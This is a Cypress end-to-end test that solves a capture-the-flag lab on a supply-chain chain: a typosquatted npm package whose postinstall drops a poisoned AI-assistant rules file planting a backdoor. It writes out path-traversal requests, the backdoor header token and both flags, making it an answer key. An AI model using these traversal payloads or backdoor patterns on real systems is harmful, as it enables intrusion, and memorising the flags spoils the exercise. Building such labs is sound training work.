describe("Supply Chain Poisoned Rules Chain — E2E (typosquat → AI rules → backdoor)", () => {
  const FLAG_TYPOSQUAT = "OSS{npm_typ0sqv4tt1ng_dr0p_4i_rul3s}";
  const FLAG_BACKDOOR = "OSS{rul3s_f1l3_b4ckd00r_3xpl01t3d}";
  const DIAG_TOKEN = "dbg_8f3a7c91e2b4d6a05e21";

  it("Step 1: /admin/documents page source contains the dev breadcrumb", () => {
    cy.request("/admin/documents").then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body).to.contain("react-toastfy");
      expect(response.body).to.contain("@lucas");
    });
  });

  it("Step 2: path traversal reads packages/react-toastfy/package.json", () => {
    cy.request("/api/files?file=../packages/react-toastfy/package.json").then(
      (response) => {
        expect(response.status).to.eq(200);
        expect(response.body.content).to.contain('"name": "react-toastfy"');
        expect(response.body.content).to.contain("postinstall");
      }
    );
  });

  it("Step 3: postinstall.js references the dropped lab artifact", () => {
    cy.request(
      "/api/files?file=../packages/react-toastfy/scripts/postinstall.js"
    ).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.content).to.contain(
        "lab/quarantine/productivity-helper.mdc"
      );
    });
  });

  it("Step 4: lab/quarantine/productivity-helper.mdc reveals flag #1 and the backdoor parameters", () => {
    cy.request(
      "/api/files?file=../lab/quarantine/productivity-helper.mdc"
    ).then((response) => {
      expect(response.status).to.eq(200);
      const content: string = response.body.content;
      expect(content).to.contain(FLAG_TYPOSQUAT);
      expect(content).to.contain("X-Debug-Auth");
      expect(content).to.contain(DIAG_TOKEN);
      expect(content).to.contain("/api/admin/diag");
      cy.verifyFlag(FLAG_TYPOSQUAT);
    });
  });

  it("Step 5: /api/admin/diag without header returns 403", () => {
    cy.request({
      url: "/api/admin/diag",
      failOnStatusCode: false,
    }).then((response) => {
      expect(response.status).to.eq(403);
      expect(response.body.flag).to.be.undefined;
    });
  });

  it("Step 5: /api/admin/diag with the magic header returns flag #2", () => {
    cy.request({
      url: "/api/admin/diag",
      headers: { "X-Debug-Auth": DIAG_TOKEN },
    }).then((response) => {
      expect(response.status).to.eq(200);
      expect(response.body.ok).to.eq(true);
      expect(response.body.flag).to.eq(FLAG_BACKDOOR);
      cy.verifyFlag(FLAG_BACKDOOR);
    });
  });
});
